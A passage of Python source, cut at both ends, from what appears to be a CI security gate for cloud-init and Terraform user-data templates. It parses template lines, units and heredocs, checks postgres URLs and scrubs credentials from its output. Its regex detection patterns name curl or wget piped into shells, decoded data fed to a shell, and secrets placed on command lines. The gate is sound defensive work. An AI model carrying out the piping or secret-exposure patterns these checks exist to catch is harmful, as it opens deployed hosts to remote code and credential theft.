                    # target is still rendered text: a terraform value in it can end the
                    # redirection and supply the subcommand (#4837 R12 R3, #5099)
                    if TF_VALUE in rw or TF_DIRECTIVE_MARK in rw:
                        out.append(REDIR_TF_HIT)
                        break
                    skip = not rm.group(1)
                    continue
                if want_value:
                    why = value_word_problem(rw)
                    if why is not None:
                        out.append("ai-memory option value: %s" % why)
                        break
                    want_value = False
                    continue
                if rw == "--" and want_value is not None:
                    want_value = None
                    continue
                if want_value is None or not FLAG_WORD_RE.match(rw.split("=", 1)[0]) or rw == "-":
                    if not BARE_LITERAL_RE.match(rw):
                        out.append("ai-memory subcommand %r is not a bare literal word" % scrub(rw)[:40])
                    break
                if "=" in rw:
                    why = value_word_problem(rw.split("=", 1)[1])
                    if why is not None:
                        out.append("ai-memory option value: %s" % why)
                        break
                    continue
                want_value = rw in AI_MEMORY_VALUE_FLAGS
        if base in ("source", ".") and args and re.match(r"^[\"']?[<$]\(", args[0]):
            out.append("source of a substitution")
        is_shell = base in SHELLS
        if is_shell or INTERP_BASE_RE.match(base):
            if is_shell:
                runs_shell = True
            has_c, sw = shell_script_word(base, args)
            if has_c:
                if sw is None:
                    out.append("%s script option without a script" % base)
                else:
                    sval, sexp = unquote(sw)
                    if sexp:
                        out.append("expanded %s -c script %r" % (base, scrub(sw)[:40]))
                    elif is_shell:
                        out.extend(companion_hits(sval, {}, depth + 1, bins))
            elif pipe_in:
                out.append("pipe into %s (stdin is the program)" % base)
            for k, a in enumerate(args):
                if re.match(r"^\d*<<", a) or re.match(r"^\d*<\(", a) or (a == "<" and k + 1 < len(args) and args[k + 1].startswith("<(")):
                    out.append("%s fed by a here-string, heredoc or process substitution" % base)
                    break
        if base == "base64" and any(a in ("-d", "--decode", "-D") or re.match(r"^-[A-Za-z]*d", a) for a in args):
            decodes = True
        if base == "xxd" and any(a.startswith("-r") for a in args):
            decodes = True
        if base == "openssl" and "-d" in args:
            decodes = True
    for sub in subs:
        out.extend(companion_hits(sub, {}, depth + 1, bins))
    if decodes and runs_shell:
        out.append("decoded data in a statement that runs a shell")
    return out


def flow_list(text: str):
    """Parse a YAML flow list ``[a, "b", 'c']``; None when it cannot."""
    s = text.strip()
    if not (s.startswith("[") and s.endswith("]")):
        return None
    s = s[1:-1]
    items, cur, i, n = [], "", 0, len(s)
    while i < n:
        c = s[i]
        if c == '"':
            j = i + 1
            while j < n and s[j] != '"':
                j += 2 if s[j] == "\\" else 1
            if j >= n:
                return None
            cur += s[i:j + 1]
            i = j + 1
            continue
        if c == "'":
            j = i + 1
            while j < n:
                if s[j] == "'" and s[j + 1:j + 2] == "'":
                    j += 2
                    continue
                if s[j] == "'":
                    break
                j += 1
            if j >= n:
                return None
            cur += s[i:j + 1]
            i = j + 1
            continue
        if c in "[]{}":
            return None
        if c == ",":
            items.append(cur.strip())
            cur = ""
            i += 1
            continue
        cur += c
        i += 1
    if cur.strip():
        items.append(cur.strip())
    out = []
    for it in items:
        if it.startswith('"'):
            try:
                out.append(json.loads(it))
            except ValueError:
                return None
        elif it.startswith("'"):
            out.append(it[1:-1].replace("''", "'"))
        else:
            out.append(it)
    return out


def yaml_scalar(text: str):
    s = text.strip()
    if s.startswith('"'):
        try:
            return json.loads(s)
        except ValueError:
            return None
    if s.startswith("'"):
        if not s.endswith("'") or len(s) < 2:
            return None
        return s[1:-1].replace("''", "'")
    return s


# ---------------------------------------------------------------- line model
class Line:
    """One logical line of a template."""

    __slots__ = ("ctx", "kind", "raw", "first", "last", "exempt", "block")

    def __init__(self, ctx, kind, raw, first, last, exempt=False, block=None):
        self.ctx = ctx
        self.kind = kind  # struct, unit, script, data, heredoc, shebang
        self.raw = raw  # physical lines joined with newlines
        self.first = first
        self.last = last
        self.exempt = exempt
        self.block = block

    @property
    def text(self) -> str:
        return norm(self.raw)

    @property
    def joined(self) -> str:
        return re.sub(r"\\[ \t]*\n", "", self.raw)


def decode_views(text: str):
    v = text
    for _ in range(5):
        u = urllib.parse.unquote(v)
        if u == v:
            break
        v = u
    v1 = v.lower()
    v2 = re.sub(r"[\"'\\]", "", v1)
    return v1, v2


def triggered(line: Line) -> bool:
    if line.exempt:
        return False
    # Every executable or written line is approved from the allowlist: a
    # vocabulary of risky words is a blocklist and misses a word it lacks
    # (add-apt-repository, wget2, pipx), so script and heredoc lines are always
    # triggered. The word list still decides for data blocks.
    if line.kind in ("struct", "unit", "shebang", "script", "heredoc"):
        return True
    v1, v2 = decode_views(line.joined)
    return bool(TRIGGER_RE.search(v1) or TRIGGER_RE.search(v2))


def parse_template(name: str, text: str, info=None):
    """Return (lines, hits, entries, statements). ``entries`` maps a write_files
    path to its keys; ``statements`` lists (where, text, state) for the
    companion rule. ``info`` (modes, consts, uses) drives rule R5; None keeps
    every non-script block data, for the first pass only."""
    text = DIRECTIVE_LINE_RE.sub("", text)
    phys = text.split("\n")
    if phys and phys[-1] == "":
        phys.pop()
    lines, hits, entries, stmts = [], [], {}, []
    top, cur_path, sq = None, None, None
    item_ind, key_ind = None, None
    i, n = 0, len(phys)
    block_no = 0
    while i < n:
        raw = phys[i]
        if not raw.strip():
            i += 1
            continue
        if raw[:len(raw) - len(raw.lstrip())].find("\t") >= 0:
            hits.append("%s:%d: tab in YAML indentation" % (name, i + 1))
        ind = len(raw) - len(raw.lstrip())
        s = raw.strip()
        if sq is not None:
            lines[-1].raw += "\n" + raw
            lines[-1].last = i + 1
            sq = scan_quotes(s, sq)
            if top in ("bootcmd", "runcmd"):
                hits.append("%s:%d: a %s item spans lines (one line per item)" % (name, i + 1, top))
            i += 1
            continue
        if s.startswith("#"):
            ctx = "top" if top is None or ind == 0 else (cur_path if top == "write_files" and cur_path else top)
            lines.append(Line(ctx, "struct", raw, i + 1, i + 1, exempt=True))
            i += 1
            continue
        if ind == 0:
            m = re.match(r"^([A-Za-z_][\w-]*):(.*)$", s)
            if m is None:
                hits.append("%s:%d: top-level line is not a 'key:' (%r)" % (name, i + 1, scrub(s)[:40]))
                top = "?"
            else:
                top = m.group(1)
                if top in ("bootcmd", "runcmd") and m.group(2).strip():
                    hits.append("%s:%d: %s must be a block list" % (name, i + 1, top))
            cur_path, item_ind, key_ind = None, None, None
            lines.append(Line("top", "struct", raw, i + 1, i + 1))
            sq = scan_quotes(s, None)
            i += 1
            continue
        if top == "write_files":
            if s.startswith("- ") or s == "-":
                pm = re.match(r"^- path:[ \t]*(\S+)$", s)
                if pm is None:
                    hits.append("%s:%d: write_files entry must start with '- path: <path>'" % (name, i + 1))
                    cur_path = "?"
                else:
                    cur_path = pm.group(1)
                    if cur_path in entries:
                        hits.append("%s:%d: write_files path %s written twice" % (name, i + 1, cur_path))
                    entries[cur_path] = {}
                key_ind = ind + 2
                lines.append(Line(cur_path, "struct", raw, i + 1, i + 1))
                i += 1
                continue
            if cur_path is None:
                hits.append("%s:%d: write_files key outside an entry" % (name, i + 1))
                cur_path = "?"
            km = re.match(r"^([A-Za-z_]\w*):(.*)$", s)
            if km is None:
                hits.append("%s:%d: write_files line is neither '- path:' nor a 'key:' of the entry (%r)" % (name, i + 1, scrub(s)[:40]))
            elif key_ind is not None and ind != key_ind:
                hits.append("%s:%d: write_files key at indent %d, the entry's keys are at %d" % (name, i + 1, ind, key_ind))
            if km is not None and cur_path in entries:
                entries[cur_path][km.group(1)] = km.group(2).strip()
            lines.append(Line(cur_path, "struct", raw, i + 1, i + 1))
            sq = scan_quotes(s, None)
            if km is not None and km.group(1) == "content":
                if km.group(2).strip() not in ("|", "|-", "|+"):
                    hits.append("%s:%d: write_files content must be a literal block (content: |), got %r" % (name, i + 1, scrub(km.group(2).strip())[:20]))
                    i += 1
                    continue
                j = i + 1
                while j < n and (not phys[j].strip() or len(phys[j]) - len(phys[j].lstrip()) > ind):
                    j += 1
                while j > i + 1 and not phys[j - 1].strip():
                    j -= 1
                block_no += 1
                parse_block(name, cur_path, phys, i + 1, j, lines, hits, stmts, block_no, info)
                i = j
                continue
            i += 1
            continue
        ctx = top or "top"
        if top in ("bootcmd", "runcmd"):
            if item_ind is None:
                item_ind = ind
            if ind != item_ind or not s.startswith("- "):
                hits.append("%s:%d: %s line is not a one-line '- ' item" % (name, i + 1, top))
            else:
                val = s[2:].strip()
                if val[:1] in ("|", ">"):
                    hits.append("%s:%d: %s item is a block scalar (one line per item)" % (name, i + 1, top))
                elif val.startswith("["):
                    items = flow_list(val)
                    if items is None:
                        hits.append("%s:%d: %s flow list cannot be parsed" % (name, i + 1, top))
                    else:
                        stmts.append(("%s:%d" % (name, i + 1), " ".join(shlex.quote(x) for x in items), {}))
                else:
                    sv = yaml_scalar(val)
                    if sv is None:
                        hits.append("%s:%d: %s item cannot be parsed" % (name, i + 1, top))
                    else:
                        stmts.append(("%s:%d" % (name, i + 1), sv, {}))
        lines.append(Line(ctx, "struct", raw, i + 1, i + 1))
        sq = scan_quotes(s, None)
        i += 1
    if sq is not None:
        hits.append("%s: a YAML quote is never closed" % name)
    return lines, hits, entries, stmts


def parse_block(name, path, phys, a, b, lines, hits, stmts, block_no, info=None):
    """Model the literal block phys[a:b] written to ``path``."""
    body = phys[a:b]
    first = next((x for x in body if x.strip()), None)
    if first is None:
        return
    bi = len(first) - len(first.lstrip())
    ded = []
    for k, x in enumerate(body):
        if x.strip() and len(x) - len(x.lstrip()) < bi:
            hits.append("%s:%d: block line indented less than its first line" % (name, a + k + 1))
        ded.append(x[bi:] if x.strip() else "")
    is_unit = "/systemd/" in path or path.endswith(UNIT_SUFFIXES) or any(x.strip() in ("[Unit]", "[Service]", "[Install]") for x in ded)
    if ded[0].startswith("#!"):
        kind = "script"
    elif is_unit:
        kind = "unit"
    elif file_is_data(path, None if info is None else info["modes"].get(path), info):
        kind = "data"
    else:
        # R5: a no-shebang file the gate cannot show is never run is checked as a
        # script (sh runs an ENOEXEC file as one), without a shebang line (#4837 R12).
        kind = "script"
    k = 0
    if ded[0].startswith("#!"):
        lines.append(Line(path, "shebang", ded[0], a + 1, a + 1, block=block_no))
        k = 1
    qs = None
    heredocs = []  # pending (delim, strip_tabs, quoted, body_is_data)
    stmt_buf, stmt_first = [], None
    st = {}
    m = len(ded)
    while k < m:
        x = ded[k]
        if not x.strip():
            k += 1
            continue
        if kind == "unit":
            grp = [x]
            exempt = x.lstrip()[:1] in ("#", ";")
            while not exempt and grp[-1].rstrip().endswith("\\") and k + 1 < m:
                k += 1
                grp.append(ded[k])
            uln = Line(path, "unit", "\n".join(grp), a + k - len(grp) + 2, a + k + 1, exempt=exempt, block=block_no)
            lines.append(uln)
            um = re.match(r"^\s*Exec\w*=[-@+!:|]*(.*)$", uln.joined, re.S)
            if not exempt and um is not None and um.group(1).strip():
                stmts.append(("%s:%d" % (name, uln.first), um.group(1), {}))
            k += 1
            continue
        if heredocs:
            delim, strip_tabs, quoted, hd_data = heredocs[0]
            chk = x.lstrip("\t") if strip_tabs else x
            lines.append(Line(path, "heredoc", x, a + k + 1, a + k + 1, block=block_no))
            if chk == delim:
                heredocs.pop(0)
                k += 1
                continue
            stmts.append(("%s:%d" % (name, a + k + 1), x, {"data": True} if hd_data else {}))
            if not quoted:
                for sub in dq_subs(x):
                    if sub is None:
                        hits.append("%s:%d: unparsable substitution in a heredoc body" % (name, a + k + 1))
                    else:
                        stmts.append(("%s:%d" % (name, a + k + 1), sub, {}))
            k += 1
            continue
        if kind == "data":
            lines.append(Line(path, "data", x, a + k + 1, a + k + 1, block=block_no))
            st["data"] = True
            stmts.append(("%s:%d" % (name, a + k + 1), x, st))
            k += 1
            continue
        start = k
        is_comment = x.lstrip().startswith("#") and qs is None
        grp = [x]
        if not is_comment:
            while grp[-1].rstrip().endswith("\\") and k + 1 < m:
                k += 1
                grp.append(ded[k])
        ln = Line(path, "script", "\n".join(grp), a + start + 1, a + k + 1, exempt=is_comment, block=block_no)
        lines.append(ln)
        k += 1
        if is_comment:
            continue
        joined = ln.joined
        starts = heredoc_starts(joined, qs)
        hd_data = info is None
        if info is not None and len(starts) == 1 and starts[0] != "bad":
            tgt = heredoc_target(joined, info["consts"])
            hd_data = tgt is not None and file_is_data(tgt, "0644", info)
        for hd in starts:
            if hd == "bad":
                hits.append("%s:%d: heredoc operator whose delimiter cannot be read" % (name, ln.first))
            else:
                heredocs.append(tuple(hd) + (hd_data,))
        qs = scan_quotes(joined, qs)
        if stmt_first is None:
            stmt_first = ln.first
        stmt_buf.append(joined)
        if qs is None:
            stmts.append(("%s:%d" % (name, stmt_first), "\n".join(stmt_buf), st))
            stmt_buf, stmt_first = [], None
    if heredocs:
        hits.append("%s: heredoc %s in %s is never terminated" % (name, heredocs[0][0], path))
    if qs is not None or stmt_buf:
        hits.append("%s: a quote opened in %s is never closed" % (name, path))


# ---------------------------------------------------------------- validators
def service_homes(lines: list) -> set:
    homes = set()
    for ln in lines:
        if not re.search(r"(?<![\w-])useradd(?![\w-])", ln.joined):
            continue
        seg = re.split(r"\|\||&&|;|\|", ln.joined[ln.joined.find("useradd"):])[0]
        try:
            toks = shlex.split(seg)
        except ValueError:
            toks = seg.split()
        home, user, k = None, None, 1
        while k < len(toks):
            tk = toks[k]
            if tk in ("-d", "--home-dir", "--home"):
                home = toks[k + 1] if k + 1 < len(toks) else None
                k += 2
                continue
            if tk.startswith("--home-dir=") or tk.startswith("--home="):
                home = tk.split("=", 1)[1]
            elif tk in ("-s", "--shell", "-g", "-G", "-u", "-c", "-k", "-e", "-f", "-K", "-p", "-b", "-Z", "--gid", "--groups", "--uid", "--comment", "--skel", "--base-dir"):
                k += 2
                continue
            elif not tk.startswith("-"):
                user = tk
            k += 1
        if home:
            homes.add(home.rstrip("/"))
        elif user:
            homes.add("/home/" + user)
    return homes


def dsn_problems(dsn: str, ctx: str) -> list:
    out = []
    try:
        parts = urllib.parse.urlsplit(dsn)
    except ValueError:
        return ["postgres URL %s cannot be parsed" % redact(dsn)]
    raw_modes = re.findall(r"(?:^|[?&])sslmode=([^&#]*)", "?" + parts.query if parts.query else "")
    if not raw_modes or raw_modes[-1] != "verify-full":
        out.append("postgres URL %s: the last raw sslmode is not exactly sslmode=verify-full (#3705 floor)" % redact(dsn))
    pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    modes = [v for k, v in pairs if k == "sslmode"]
    if not modes:
        out.append("postgres URL %s has no sslmode key as sqlx reads it" % redact(dsn))
    elif modes[-1] != "verify-full":
        out.append("postgres URL %s: sqlx reads sslmode=%s (the last one, percent-decoded)" % (redact(dsn), modes[-1][:20]))
    for k, _ in pairs:
        if k.lower() == "sslmode" and k != "sslmode":
            out.append("postgres URL %s has a case-variant sslmode key %r (sqlx keys are case-sensitive)" % (redact(dsn), k))
        if k.lower() in ("password", "passfile"):
            out.append("postgres URL %s carries a %s key" % (redact(dsn), k.lower()))
    netloc = parts.netloc
    if "@" in netloc and ":" in netloc.rsplit("@", 1)[0] and ctx != STORE_URL_PATH:
        out.append("postgres URL with a userinfo password outside %s" % STORE_URL_PATH)
    return out


def redact(dsn: str) -> str:
    return re.sub(r"//[^@/]*@", "//<userinfo>@", dsn)[:70]


# a postgres URL up to its last "@" (a password can hold "/" or "@"), and a URL cut before
# its "@" that still holds "user:password": both are userinfo, never printed (#5438)
SCRUB_UPTO_AT = re.compile(r"(postgres(?:ql)?://)[^\s\"']*@", re.I)
SCRUB_CUT = re.compile(r"(postgres(?:ql)?://)[^\s\"'/@]*:[^\s\"'/@]*(?=[\s\"']|$)", re.I)


def scrub(text: str) -> str:
    """Text safe to print: the userinfo of every postgres URL in it is replaced (#5438).
    The only password the gate tolerates is the store-url placeholder, but a template can
    carry a real one, and a failure line that quotes the line or a word cut from it would
    put that password in the CI log. Applied to every hit before it is printed, and
    before any cut to a fixed width, so a cut cannot drop the "@" that marks the userinfo."""
    return SCRUB_CUT.sub(r"\1<userinfo>", SCRUB_UPTO_AT.sub(r"\1<userinfo>@", text))


def printable(lines, prefix: str = "") -> str:
    """The text main() prints for hits or faults: every line scrubbed (#5438)."""
    return "\n".join(prefix + scrub(x) for x in lines)


def validate_line(ln: Line, homes: set, binaries: set) -> list:
    j = ln.joined
    v1, v2 = decode_views(j)
    out = []
    for m in DSN_RE.finditer(j):
        out.extend(dsn_problems(m.group(0), ln.ctx))
    if "allow_lax" in v1:
        out.append("lax store-url permission opt-out")
    serve_re = r"(?<![\w-])ai-memory[\"']?[\s,]+(?:[^\s,]+[\s,]+)*?[\"']?serve(?![\w-])"
    # v2 drops quotes and backslashes, so a quote- or backslash-split serve is read as serve (#4837 R6).
    if not (ln.kind == "unit" and re.match(r"[ \t]*ExecStart=", j)) and (re.search(serve_re, v1) or re.search(serve_re, v2)):
        out.append("ai-memory serve outside the unit ExecStart (serve flags are checked only on ExecStart)")
    if re.search(r"pgpassword|pgpassfile", v1):
        out.append("PGPASSWORD/PGPASSFILE")
    if re.search(r"ai_memory_store_url\s*=", v1):
        out.append("AI_MEMORY_STORE_URL= (use AI_MEMORY_STORE_URL_FILE, #4577)")
    if re.search(r"(?<![\w-])--store(?!\w)", v2):
        out.append("a --store flag fragment (the store URL reaches the daemon only through AI_MEMORY_STORE_URL_FILE, #4577/#4693)")
    for b in sorted(binaries):
        if re.search(r"(?:>|(?<![\w-])tee\s+(?:-\S+\s+)*)\s*[\"']?" + re.escape(b) + r"(?![\w.-])", j):
            out.append("a redirect or tee writes the unit binary %s (only install may place it)" % b)
    if re.search(r"--store[-_]url", v2) or re.search(r"--store[-_]url", re.sub(r"\s+", "", v2)):
        out.append("--store-url (the URL reaches the daemon only through AI_MEMORY_STORE_URL_FILE, #4577)")
    if re.search(r"(?<![\w-])password\s+'", v1):
        out.append("SQL PASSWORD literal (the role password lands on a psql argv and in the script)")
    if re.search(r"\$\{[^}]*(?:password|secret|token|passwd)[^}]*\}", v1):
        out.append("a terraform secret interpolated into user-data (readable from the instance metadata service)")
    if re.search(r"(?<![\w-])password\s*=", v2):
        out.append("password= (a credential in a world-readable line or on an argv)")
    if re.search(r"(?<![\w-])(?:curl|wget)(?![\w-])", v1):
        if re.search(r"\|\|\s*true\b", v1):
            out.append("curl/wget failure ignored with || true")
        if re.search(r"(?<!\|)\|(?!\|)&?\s*(?:sudo\s+(?:-\S+\s+)*)?(?:\S*/)?(?:sh|bash|dash|zsh|ksh|tar|python[\d.]*|perl|ruby|node|source|\.)(?![\w-])", v1):
            out.append("curl/wget piped into a shell, tar or interpreter")
    if re.search(r"(?<![\w-])tar(?![\w-])", v1) and re.search(r"(?<![\w-])(?:-[a-z]*x[a-z]*|x[a-z]*f|--extract|--get)(?![\w-])", v1) and re.search(r"\|\|\s*true\b", v1):
        out.append("tar extract failure ignored with || true")
    em = re.match(r"^\s*exec\w*=\s*([-@+!:]*)(\S+)", v1)
    if em is not None and ln.kind == "unit":
        binary = em.group(2)
        for h in homes:
            if binary.startswith(h.lower() + "/"):
                out.append("unit runs %s from inside the service home %s (the service user can substitute it)" % (binary, h))
    if ln.kind == "struct":
        if re.match(r"^\s*-?\s*(?:encoding|source|uri)\s*:", v1) or "!!binary" in v1:
            out.append("write_files encoding:/source:/uri:/!!binary hides the written bytes")
        pm = re.match(r"^\s*permissions\s*:\s*(.*)$", j)
        if pm is not None and ln.ctx == STORE_URL_PATH and pm.group(1).strip() != "'0600'":
            out.append("%s permissions must be '0600'" % STORE_URL_PATH)
    if "store-url" in v1:
        for cm in re.finditer(r"(?<![\w-])chmod\s+((?:-\S+\s+)*)(\S+)", v1):
            if cm.group(2) not in ("600", "0600"):
                out.append("chmod of the store-url file to %s (must stay 0600)" % cm.group(2))
    return out


# ---------------------------------------------------------------- user-data
def render_size_view(text: str) -> str:
    t = text.replace("$${", "\x00").replace("%%{", "\x01")
    t = re.sub(r"%\{[^}]*\}", "", t)

    def stand_in(m):
        nm = m.group(1).lower()
        return "x" * (256 if "url" in nm else 64)

    t = re.sub(r"\$\{\s*([^}]*)\}", stand_in, t)
    return t.replace("\x00", "${").replace("\x01", "%{")


def userdata_hits(name: str, scope: str, text: str, maintf) -> list:
    if scope not in USER_DATA_LIMITS:
        return ["FAULT:%s: no user-data limit known for scope %r" % (name, scope)]
    limit = USER_DATA_LIMITS[scope]
    rendered = render_size_view(text).encode("utf-8")
    if len(rendered) <= limit:
        return []
    tpl = posixpath.basename(name)
    want = re.compile(r"user_data_base64\s*=\s*base64gzip\(templatefile\(\"\$\{path\.module\}/" + re.escape(tpl) + "\"")
    if maintf is None or not want.search(maintf):
        return ["%s: rendered user-data is %d bytes, over the %d-byte limit of %s, and main.tf does not pass it through user_data_base64 = base64gzip(...) (#4703)" % (name, len(rendered), limit, scope)]
    gz = len(gzip.compress(rendered, mtime=0))
    if gz > limit:
        return ["%s: gzip of the rendered user-data is %d bytes, over the %d-byte limit (#4703)" % (name, gz, limit)]
    return []


# ---------------------------------------------------------------- allowlist
# A pending entry skips the validators, so its tracker is a closed set with a ceiling on
# the entries each one may hold (#5098): moving an approved line to the pending list, or
# citing a placeholder issue, is a fault. Change this only in the PR that lands or files
# the tracker; a ceiling only falls.
PENDING_TRACKERS = {"#4610": 1, "#4671": 6, "#4712": 3}


def load_entries(text: str, pending: bool, faults: list, label: str) -> list:
    """Parse allowlist text into (scope, issue, ctx, line, file_lineno)."""
    out = []
    for no, raw in enumerate(text.splitlines(), 1):
        if not raw.strip() or raw.startswith("#"):
            continue
        parts = raw.split(" | ", 2)
        if len(parts) != 3 or not parts[1].strip() or not parts[2].strip():
            faults.append("%s:%d: malformed entry (want '<scope> | <context> | <line>')" % (label, no))
            continue
        head, ctx, line = parts[0], parts[1], parts[2]
        issue = None
        if pending:
            hm = re.match(r"^(\S+) (#[1-9]\d*)$", head)
            if hm is None:
                faults.append("%s:%d: malformed pending head %r (want '<scope> #<issue>')" % (label, no, head))
                continue
            head, issue = hm.group(1), hm.group(2)
            if issue not in PENDING_TRACKERS:
                faults.append("%s:%d: tracker %s is not a known pending tracker" % (label, no, issue))
                continue
        if head not in SCOPES:
            faults.append("%s:%d: unknown scope %r" % (label, no, head))
            continue
        if ctx != ctx.strip() or " " in ctx:
            faults.append("%s:%d: context %r is not one word" % (label, no, ctx))
            continue
        if line != norm(line):
            faults.append("%s:%d: line is not whitespace-normalised" % (label, no))
            continue
        out.append((head, issue, ctx, line, no))
    for tr, cap in sorted(PENDING_TRACKERS.items()) if pending else ():
        n = sum(1 for e in out if e[1] == tr)
        if n > cap:
            faults.append("%s: tracker %s holds %d entries, more than its %d" % (label, tr, n, cap))
    return out


def tf_regions(text: str) -> list:
    """Each Terraform directive region (opener .. matching end, or a lone
    directive line) as one whitespace-normalised text, in file order."""
    out, cur, depth = [], [], 0
    for raw in text.split("\n"):
        is_dir = DIRECTIVE_LINE_RE.match(raw) is not None
        if depth == 0 and not is_dir:
            continue
        cur.append(raw)
        if is_dir and TF_OPEN_RE.match(raw):
            depth += 1
        elif is_dir and TF_CLOSE_RE.match(raw):
            depth -= 1
        if depth <= 0:
            out.append(norm(" ".join(cur)))
            cur, depth = [], 0
    if cur:
        out.append(norm(" ".join(cur)))
    return out


def scope_of(name: str) -> str:
    return posixpath.basename(posixpath.dirname(name))


def tf_render(text: str) -> str:
    """What bash sees after terraform renders the template: ``$${`` is a
    literal ``${``, ``%%{`` a literal ``%{``, a ``%{ }`` directive vanishes and
    each ``${expr}`` becomes the shell expansion ``${TFVALUE}``: the rendered
    value is operator-supplied, so an unquoted one is word-split by the shell
    and only a fully double-quoted word is safe (#4837)."""
    t = text.replace("$${", "\x00").replace("%%{", "\x01")
    t = re.sub(r"%\{[^}]*\}", TF_DIRECTIVE_MARK, t)
    t = re.sub(r"\$\{[^}]*\}", lambda _m: TF_VALUE, t)
    return t.replace("\x00", "${").replace("\x01", "%{")


def tf_region_spans(text: str) -> list:
    """(first, last) physical line index of each region tf_regions returns, same order."""
    out, start, depth = [], None, 0
    for i, raw in enumerate(text.split("\n")):
        is_dir = DIRECTIVE_LINE_RE.match(raw) is not None
        if depth == 0 and not is_dir:
            continue
        if start is None:
            start = i
        if is_dir and TF_OPEN_RE.match(raw):
            depth += 1
        elif is_dir and TF_CLOSE_RE.match(raw):
            depth -= 1
        if depth <= 0:
            out.append((start, i))
            start, depth = None, 0
    if start is not None:
        out.append((start, len(text.split("\n")) - 1))
    return out


def classify(name: str, text: str):
    """parse_template to a fixpoint of rule R5: a block or heredoc stays data only
    while no executed statement uses its path. Each pass can only move data to
    executed, so the loop ends; failing to settle is a hit (fail closed)."""
    lines, hits, entries, stmts = parse_template(name, text)
    modes = {p: e.get("permissions") for p, e in entries.items()}
    info = {"modes": modes, "consts": {}, "uses": []}
    prev = None
    for _ in range(8):
        lines, hits, entries, stmts = parse_template(name, text, info)
        sig = tuple((w, bool(st.get("data"))) for w, _s, st in stmts)
        if sig == prev:
            return lines, hits, entries, stmts
        prev = sig
        live = [x for x in stmts if not x[2].get("data")]
        consts = literal_consts(live)
        uses = []
        for _w, stmt, _st in live:
            path_uses(tf_render(stmt), consts, uses)
        info = {"modes": modes, "consts": consts, "uses": expand_uses(uses, var_values(live))}
    return lines, hits + ["%s: rule R5 did not settle on which files are data" % name], entries, stmts


def nameref_facts(texts: list):
    """(names, poisoned) for declare/typeset/local -n (#5174). A nameref and its target
    share one value, and an assignment through the nameref writes the target, so every
    name in an -n declaration, and every name assigned to a nameref, has a value the gate
    cannot read. A target built from an expansion can be any name: then no name is
    resolved (poisoned, fail closed). Bash removes quotes and backslashes before the
    builtin reads its words, so the words are read without them; an option word that
    holds an expansion can be -n (poisoned), and every name word of an -n declaration is
    a nameref, not only the first (#5323, #5324)."""
    refs, names, poisoned = set(), set(), False
    plain = [re.sub(r"[\"'\\]", "", text) for text in texts]
    for text in plain:
        for m in re.finditer(r"(?<![\w$./-])(?:declare|typeset|local)(?![\w-])([^;&|\n]*)", text):
            words, nameref, i = m.group(1).split(), False, 0
            while i < len(words) and (words[i][:1] in "-+" or re.search(r"[$`]", words[i].split("=", 1)[0])):
                if words[i] == "--":
                    i += 1
                    break
                if re.search(r"[$`]", words[i]):
                    nameref = poisoned = True
                elif words[i].startswith("-") and "n" in words[i]:
                    nameref = True
                i += 1
            if not nameref:
                continue
            for w in words[i:]:
                refs.update(re.findall(r"(?<![\w$-])([A-Za-z_]\w*)", w.split("=", 1)[0]))
                names.update(re.findall(r"(?<![\w$-])[A-Za-z_]\w*", w))
                poisoned = poisoned or "$" in w or "`" in w
    for text in plain:
        for m in re.finditer(r"(?<![\w$])([A-Za-z_]\w*)(?:\[[^]]*\])?\+?=(\S*)", text):
            if m.group(1) in refs:
                names.update(re.findall(r"(?<![\w$-])[A-Za-z_]\w*", m.group(2)))
                poisoned = poisoned or "$" in m.group(2) or "`" in m.group(2)
    return names | refs, poisoned


def word_end(text: str, i: int) -> int:
    """Index just past the shell word that starts at text[i] (quotes, backslashes,
    backticks and $( ) / array parentheses kept inside the word)."""
    q, depth = None, 0
    while i < len(text):
        c = text[i]
        if q is not None:
            if c == "\\" and q != "'":
                i += 1
            elif c == q:
                q = None
        elif c == "\\":
            i += 1
        elif c in "'\"`":
            q = c
        elif c == "(":
            depth += 1
        elif c == ")":
            if depth == 0:
                break
            depth -= 1
        elif depth == 0 and (c.isspace() or c in ";&|<>"):
            break
        i += 1
    return i


ASSIGN_NAME_RE = re.compile(r"(?<![\w$])([A-Za-z_]\w*)(?:\[[^]]*\])?\+?=")


def split_names(texts: list):
    """(names, poisoned, seps): the names whose assigned value an unquoted expansion splits
    into more than one word (#5327). The gate reads one value as one operand, so such a
    name is not resolved: "/usr/bin/env <binary>" or "-c 0 <glob>" is a wrapper and a
    binary, or a glob, once split. The split characters are blank, tab and newline plus
    every character of a literal IFS value the template assigns; an IFS value the gate
    cannot read (other than restoring a name that only ever holds $IFS) poisons every
    non-empty value (fail closed, #4869)."""
    words = []
    for text in texts:
        for m in ASSIGN_NAME_RE.finditer(text):
            words.append((m.group(1), text[m.end():word_end(text, m.end())]))
    seps, poisoned = set(" \t\n"), False
    for name, word in words:
        if name != "IFS":
            continue
        if expanded(word):
            saved = re.fullmatch(r"\$\{?([A-Za-z_]\w*)\}?", unquote(word)[0])
            held = [w for n, w in words if saved and n == saved.group(1)]
            if not (held and all(re.fullmatch(r"\$\{?IFS\}?", unquote(w)[0]) for w in held)):
                poisoned = True
        else:
            seps |= set(unquote(word)[0])
    out = set()
    for name, word in words:
        val = re.sub(r"\$\([^()]*\)|`[^`]*`", "", unquote(word)[0])
        if name != "IFS" and (any(c in seps for c in val) or (poisoned and val)):
            out.add(name)
    return out, poisoned, seps


def var_values(stmts: list) -> dict:
    """NAME -> every literal text the template assigns it (assignment, export, local,
    declare, for-loop word) (#5095). A value only adds uses in expand_uses (the original
    use stays), so a name an unquoted expansion splits keeps its values and also holds
    each field, and a name read from input keeps every literal it is assigned anywhere,
    since a read may run after the use, may not run, or may run in a subshell (#5356,
    5-agent vote 4d3ea1c5). An IFS the gate cannot read collapses each split name past
    the cap. A nameref can
    carry any name's value to any other name, so a template that declares one maps every
    name to VALUES_PAST_CAP (ANY_NAME): every use through a name reads as the root use
    (fail closed, #5356, #4869)."""
    vals = {}
    for _w, stmt, _st in stmts:
        text = tf_render(stmt)
        for m in re.finditer(r"(?<![\w$])([A-Za-z_]\w*)(?:\[[^]]*\])?(\+?)=(\S*)", text):
            v = unquote(m.group(3).rstrip(";"))[0]
            # NAME+=text appends to every value NAME already holds; an append can repeat
            # (a loop), so the prior value followed by any text is kept too (#5174)
            if vals.get(m.group(1)) == {VALUES_PAST_CAP}:
                continue
            prior = set(vals.get(m.group(1), {""})) if m.group(2) else {""}
            add = {p + v for p in prior} | ({p + "*" for p in prior} if m.group(2) else set())
            vals.setdefault(m.group(1), set()).update(add)
            # each append at least doubles the set: past EXPAND_CAP values the name stands for
